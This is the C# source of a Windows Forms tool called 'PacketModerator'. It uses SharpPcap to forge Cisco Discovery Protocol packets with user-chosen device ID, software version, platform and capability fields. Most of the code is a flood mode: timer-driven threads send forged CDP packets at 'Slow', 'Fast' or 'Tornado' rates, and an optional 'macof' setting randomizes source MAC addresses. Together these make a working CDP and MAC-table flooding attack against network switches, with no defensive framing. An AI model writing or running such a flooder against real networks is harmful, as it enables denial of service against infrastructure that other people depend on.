using System;
using System.Collections.Generic;

using System.Linq;
using System.Text;
using System.Windows.Forms;
using PacketDotNet.LLDP;
using SharpPcap.WinPcap;
using SharpPcap;
using SharpPcap.LibPcap;
using System.Threading;




namespace PacketModerator
{
    public partial class frmMain : Form
    {

        //public  IList<PcapDotNet.Core.LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
        SharpPcap.LibPcap.LibPcapLiveDeviceList devices;
        SharpPcap.LibPcap.LibPcapLiveDevice device;
        bool Continue = false;
        int lastIndexOfDevice = 0;
        long CDCount = 0;

        public frmMain()
        {
            InitializeComponent();


            ListDevices();
        }

        private void ListDevices()
        {

            Log("Generating Devices List");
            devices = SharpPcap.LibPcap.LibPcapLiveDeviceList.Instance;

            foreach (SharpPcap.LibPcap.LibPcapLiveDevice dev in devices)
                lstDevices.Items.Add(dev.Description.ToString());




        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            new frmAbout().ShowDialog();

            var ex = new DHCPPacket();
        }

        public void Log(String log)
        {
            txtLog.Text += System.Environment.NewLine + log;
        }


        private void lstDevices_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (lstDevices.SelectedIndex > -1)
            {
                lblSelectedDevice.Text = lstDevices.SelectedItem.ToString();
                Log("selected device changed to " + devices[lstDevices.SelectedIndex].Description.ToString());
                device = devices[lstDevices.SelectedIndex];


            }
        }

        public void SendIPPacket(int mode)
        {

           if(device == null)
           {
               Log("Please Select an interface");
               return;
           }

            int readTimeoutMilliseconds = 1000;
            device.Open(DeviceMode.Normal, readTimeoutMilliseconds);


            if (!chkFlood.Checked)
            {
                for (int i = 0; i < Convert.ToInt16(txtCount.Text); i++)
                {
                    CdpPacket cdp = new CdpPacket();
                    cdp.AddTLV(CdpPacket.CdpTypes.CDP_TYPE_DEVID, txtDeviceID.Text + i);
                    cdp.AddTLV(CdpPacket.CdpTypes.CDP_TYPE_SOFTWARE_VERSION, txtSoftVersion.Text);
                    cdp.AddTLV(CdpPacket.CdpTypes.CDP_TYPE_PLATFORM, txtPlatform.Text);

                    device.SendPacket(cdp.PacketBytes);
                }
                device.Close();
            }
            else
            {
                lastIndexOfDevice = new Random().Next(100, 1000); 
                Continue = true;
                tFlood.Enabled = true;
                btnStopFlood.Visible = true;
                imgLoading.Visible = true;

                var x = 1;

            }


        }
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        private void btnLaunch_Click(object sender, EventArgs e)
        {
            SendIPPacket(1);

        }

        private void btnCap_Click(object sender, EventArgs e)
        {
            int capabilities = 0;

            if (chkIsRouter.Checked)
                capabilities += Convert.ToInt16(chkIsRouter.Tag);

            if (chkIsTransparentBridge.Checked)
                capabilities += Convert.ToInt16(chkIsTransparentBridge.Tag);

            if (chkIsSourceRouteBridge.Checked)
                capabilities += Convert.ToInt16(chkIsSourceRouteBridge.Tag);

            if (chkIsSwitch.Checked)
                capabilities += Convert.ToInt16(chkIsSwitch.Tag);

            if (chkIsHost.Checked)
                capabilities += Convert.ToInt16(chkIsHost.Tag);

            if (chkIsIGMPCapable.Checked)
                capabilities += Convert.ToInt16(chkIsIGMPCapable.Tag);

            if (chkIsRepeater.Checked)
                capabilities += Convert.ToInt16(chkIsRepeater.Tag);


            txtCapabilities.Text = "000000" + capabilities.ToString("X");

        }

        private void chkFlood_CheckedChanged(object sender, EventArgs e)
        {
            txtCount.Enabled = !chkFlood.Checked;

            chkMacof.Visible = chkFlood.Checked;
            rdFast.Visible = chkFlood.Checked;
            rdSlow.Visible = chkFlood.Checked;
            rdTornado.Visible = chkFlood.Checked;
        }

        private void tFlood_Tick(object sender, EventArgs e)
        {
            lblCDPCount.Text = CDCount + " Packet Sent";
            System.Threading.Thread t = new System.Threading.Thread(new ThreadStart(Flood));
            t.Start();
            
           // Flood();
        }

        private void Flood()
        {

            int count = 100;
            if (rdTornado.Checked)
                count = 100;
            if (rdSlow.Checked)
                count = 10;
            if (rdFast.Checked)
                count = 50;

            for (int i = 1; i < count; i++)
            {
                CdpPacket cdp = new CdpPacket();
                cdp.AddTLV(CdpPacket.CdpTypes.CDP_TYPE_DEVID, txtDeviceID.Text + (lastIndexOfDevice++));
                cdp.AddTLV(CdpPacket.CdpTypes.CDP_TYPE_SOFTWARE_VERSION, txtSoftVersion.Text);
                cdp.AddTLV(CdpPacket.CdpTypes.CDP_TYPE_PLATFORM, txtPlatform.Text);
                cdp.AddTLV(CdpPacket.CdpTypes.CDP_TYPE_CAPABILITY, "0x"  + txtCapabilities.Text);


                if (chkMacof.Checked)
                {
                    List<ushort> SourceMac = new List<ushort>();
                    for (int j = 1; j <= 6; j++)
                    {
                        SourceMac.Add(Convert.ToUInt16(GetRandomNumber(1, 255)));
                    }
                    cdp.SourceMac = SourceMac;
                }


                device.SendPacket(cdp.PacketBytes);
            }
            CDCount += 100;
        }
        private static readonly Random getrandom = new Random();
        private static readonly object syncLock = new object();
        public static int GetRandomNumber(int min, int max)
        {
            lock (syncLock)
            { // synchronize
                return getrandom.Next(min, max);
            }
        }

        private void btnStopFlood_Click(object sender, EventArgs e)
        {
            Continue = false;
            tFlood.Enabled = false;
            btnStopFlood.Visible = false;
            //device.Close();
            imgLoading.Visible = false;
            Log(CDCount + " CDP Sent");
            CDCount = 0;




        }

        private void btnAbout_Click(object sender, EventArgs e)
        {
            new frmAbout().Show();
        }
    }
}
